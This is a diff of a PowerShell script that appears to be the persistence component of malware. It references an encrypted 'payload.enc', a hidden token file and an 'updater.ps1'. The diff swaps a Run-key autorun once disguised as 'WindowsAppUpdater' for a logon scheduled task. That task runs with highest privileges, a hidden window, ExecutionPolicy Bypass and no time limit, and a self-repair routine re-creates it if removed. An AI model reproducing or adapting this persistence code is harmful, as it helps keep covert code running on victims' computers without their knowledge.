@@ -10,7 +10,7 @@ $pFile = "$pDir\payload.enc"
 $kFile = "$kDir\.token"
 $rFile = "$rDir\updater.ps1"
 
-$aName = "WindowsAppUpdater"
+$aName = "MyAutoRunTask"
 
 $mId = [System.BitConverter]::ToString(
     [System.Security.Cryptography.MD5]::Create().ComputeHash(
@@ -73,26 +73,56 @@ function tProc {
 
 function tRun {
     param([string]$n)
-    $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     try {
-        $v = Get-ItemProperty $rp -Name $n -ErrorAction Stop
-        if ($v.$n) {
-            lInfo "Autorun configured" @{ name = $n; command = $v.$n }
+        $task = Get-ScheduledTask -TaskName "$n" -ErrorAction Stop
+        if ($task.State -eq 'Ready') {
+            lInfo "Autorun (Scheduled Task) configured" @{ name = $n; state = $task.State }
             return $true
+        } else {
+            lErr "Autorun task exists but not ready" @{ expectedName = $n; state = $task.State }
+            return $false
         }
     } catch {
-        lErr "Autorun missing" @{ expectedName = $n }
+        lErr "Autorun missing (Scheduled Task not found)" @{ expectedName = $n }
         return $false
     }
 }
 
 function fixRun {
     param([string]$n, [string]$rf)
-    $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     try {
-        $cmd = "powershell -w h -ep bypass -f `"$rf`""
-        Set-ItemProperty $rp -Name $n -Value $cmd -Force -ErrorAction Stop
-        lInfo "Autorun fixed" @{ name = $n; command = $cmd }
+        # Удаляем старую задачу, если есть
+        schtasks /delete /tn "$n" /f 2>$null | Out-Null
+        
+        $workDir = Split-Path $rf -Parent
+        
+        # Создаём действие для задачи
+        $action = New-ScheduledTaskAction `
+            -Execute "powershell.exe" `
+            -Argument "-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$rf`""
+        
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal `
+            -UserId "$env:USERDOMAIN\$env:USERNAME" `
+            -LogonType Interactive `
+            -RunLevel Highest
+        
+        $settings = New-ScheduledTaskSettingsSet `
+            -AllowStartIfOnBatteries `
+            -DontStopIfGoingOnBatteries `
+            -StartWhenAvailable `
+            -MultipleInstances IgnoreNew `
+            -ExecutionTimeLimit 0
+        
+        Register-ScheduledTask `
+            -TaskName "$n" `
+            -Action $action `
+            -Trigger $trigger `
+            -Principal $principal `
+            -Settings $settings `
+            -Force | Out-Null
+        
+        lInfo "Autorun fixed (Scheduled Task)" @{ name = $n }
         return $true
     } catch {
         lErr "Failed to fix autorun" @{ error = $_.Exception.Message }
